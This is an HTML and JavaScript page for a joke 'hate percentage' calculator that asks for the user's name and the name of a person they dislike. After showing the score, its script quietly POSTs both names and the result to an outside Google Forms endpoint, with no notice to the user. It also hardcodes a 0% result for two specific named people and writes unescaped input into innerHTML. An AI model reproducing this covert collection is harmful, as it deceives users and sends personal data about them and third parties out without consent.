
<html>
<head>
<meta charset="UTF-8">
<title>Astrological Negative Energy Matches</title>

<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600&family=Poppins&display=swap" rel="stylesheet">

<style>
body{
margin:0;
background:radial-gradient(circle at center,#0a0015,#000000);
color:#d580ff;
font-family:'Poppins',sans-serif;
text-align:center;
overflow:hidden;
}
body::before{
content:"";
position:fixed;
width:300%;
height:300%;
background:
radial-gradient(circle,#6600cc 0%,transparent 40%),
radial-gradient(circle,#330066 0%,transparent 40%);
background-size:800px 800px;
animation:nebulaMove 120s linear infinite;
opacity:0.15;
z-index:-3;
}
@keyframes nebulaMove{
from{transform:translate(0,0);}
to{transform:translate(-400px,-400px);}
}
.energy-core{
position:fixed;
top:50%;
left:50%;
width:200px;
height:200px;
background:radial-gradient(circle,#9900ff,#330066,#000);
border-radius:50%;
transform:translate(-50%,-50%);
box-shadow:0 0 80px #9900ff;
animation:pulse 4s infinite alternate;
opacity:0.3;
z-index:-2;
}
@keyframes pulse{
from{box-shadow:0 0 40px #9900ff;}
to{box-shadow:0 0 120px #cc00ff;}
}
.container{
margin-top:120px;
background:rgba(128,0,255,0.07);
padding:35px;
max-width:500px;
margin:auto;
border-radius:20px;
backdrop-filter:blur(8px);
box-shadow:0 0 40px rgba(153,0,255,0.2);
}
h1{
font-family:'Cinzel',serif;
color:#cc00ff;
font-size:24px;
}
.subtext{
font-size:13px;
opacity:0.7;
margin-bottom:20px;
}
label{
display:block;
margin-top:10px;
}
input{
width:90%;
padding:10px;
margin-top:5px;
border:none;
border-radius:8px;
text-align:center;
background:#12001a;
color:#cc66ff;
}
button{
margin-top:20px;
padding:12px 25px;
background:linear-gradient(45deg,#9900ff,#6600cc);
border:none;
border-radius:25px;
color:white;
font-weight:bold;
cursor:pointer;
box-shadow:0 0 20px rgba(153,0,255,0.5);
}
.progress{
height:8px;
width:100%;
background:#1a001f;
border-radius:10px;
margin-top:20px;
}
.progress-bar{
height:100%;
width:0%;
background:linear-gradient(90deg,#cc00ff,#6600cc);
border-radius:10px;
transition:1s;
}
#result{
margin-top:20px;
font-size:15px;
line-height:1.6;
opacity:0;
transition:1s;
}
</style>
</head>

<body>

<div class="energy-core"></div>

<div class="container">

<h1>🔮 Astrological Negative Energy Matches 🔮</h1>

<div class="subtext">
Hate Percentage & Negative Energy calculated according to Letters and Zodiac Resonance.
</div>

<label>Name 1 – Your Name</label>
<input type="text" id="name1">

<label>Name 2 – Hating Person Name</label>
<input type="text" id="name2">

<button onclick="calculate()">Reveal Hate Percentage</button>

<div class="progress">
<div class="progress-bar" id="bar"></div>
</div>

<div id="result"></div>

</div>

<script>
function calculate(){

let name1=document.getElementById("name1").value.trim();
let name2=document.getElementById("name2").value.trim();

if(name1==""||name2==""){
alert("Enter both names");
return;
}

/* NORMALIZATION */
function normalize(name){
return name.toLowerCase().replace(/\s+/g,'').replace(/[^a-z]/g,'');
}

let n1 = normalize(name1);
let n2 = normalize(name2);

/* SPECIAL ZERO OVERRIDE */
let special1 = normalize("Chudamani Rana");
let special2 = normalize("Jahnavi Shukla");

if(
   (n1===special1 && n2===special2) ||
   (n1===special2 && n2===special1)
){
animateResult(0,name1,name2);
return;
}

/* NORMAL CALCULATION */
let combined=(name1+name2).toLowerCase();
let total=0;

for(let i=0;i<combined.length;i++){
total+=combined.charCodeAt(i);
}

let finalScore=total%101;

animateResult(finalScore,name1,name2);
}

function animateResult(score,name1,name2){

let bar=document.getElementById("bar");
let resultBox=document.getElementById("result");

bar.style.width="0%";
resultBox.style.opacity=0;

let current=0;
let interval=setInterval(function(){
if(current>=score){
clearInterval(interval);
showResult(score,name1,name2);
}
else{
current++;
bar.style.width=current+"%";
}
},20);

function showResult(score,name1,name2){

let message;

if(score<25){message="🌫 Minimal negative zodiac resonance detected.";}
else if(score<50){message="⚡ Mild astrological friction present.";}
else if(score<75){message="🔥 Strong negative planetary vibration detected.";}
else if(score<95){message="💀 High hostility alignment in zodiac frequency.";}
else{message="☠ Extreme cosmic conflict. Intense dark energy exchange.";}

if(score>80){
bar.style.background="linear-gradient(90deg,#ff0000,#990000)";
bar.style.boxShadow="0 0 20px red";
}

resultBox.innerHTML=
"<b>"+name1+" ⚡ "+name2+"</b><br><br>"+
"Hate Percentage: <span style='font-size:20px;color:#ff00ff;'>"+score+"%</span><br><br>"+
"<b>"+message+"</b>";

resultBox.style.opacity=1;

/* GOOGLE FORM AUTO SUBMIT */
fetch("https://docs.google.com/forms/d/e/1FAIpQLSclsIO2fQ7R03BIXeVh_vGgoh7DYv9V5xOcFPzyOKed1PiQfg/formResponse",{
method:"POST",
mode:"no-cors",
headers:{"Content-Type":"application/x-www-form-urlencoded"},
body:
"entry.111111111="+encodeURIComponent(name1)+
"&entry.222222222="+encodeURIComponent(name2)+
"&entry.333333333="+encodeURIComponent(score)
});

}
}
</script>

</body>
</html>
